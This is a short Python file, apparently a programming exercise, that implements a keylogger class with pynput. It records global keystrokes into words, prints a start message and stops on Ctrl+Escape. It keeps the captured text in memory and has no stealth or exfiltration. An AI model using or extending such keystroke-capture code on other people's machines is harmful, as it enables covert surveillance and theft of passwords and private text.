from pynput import keyboard
from  interface_key_logger import IKeyLogger  # Your interface

class KeyLogger(IKeyLogger):
    def __init__(self):
        self.logged_keys = []
        self.current_word = []
        self.words = []
        self.ctrl_pressed = False  # Track if Ctrl is pressed
        self.listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)

    def _on_press(self, key):
        # Detect Ctrl + Escape to stop the keylogger
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            self.ctrl_pressed = True
        elif key == keyboard.Key.esc and self.ctrl_pressed:

            self.stop_logging()

        # Record keys into words
        try:
            char = key.char
            if char:
                self.current_word.append(char)
        except AttributeError:
            if key == keyboard.Key.space:
                if self.current_word:
                    self.words.append(''.join(self.current_word))
                    self.current_word = []
            elif key == keyboard.Key.enter:
                if self.current_word:
                    self.words.append(''.join(self.current_word))
                    self.current_word = []
            elif key == keyboard.Key.backspace:
                if self.current_word:
                    self.current_word.pop()

    def _on_release(self, key):
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            self.ctrl_pressed = False

    def start_logging(self) -> None:
        print("Keylogger started. Press Ctrl + Escape to stop.")
        self.listener.start()
        self.listener.join()

    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self):
        if self.current_word:
            self.words.append(''.join(self.current_word))
            self.current_word = []
        return self.words


# --- Example usage ---
if __name__ == "__main__":
    logger = KeyLogger()
    logger.start_logging()
    print( logger.get_logged_keys())


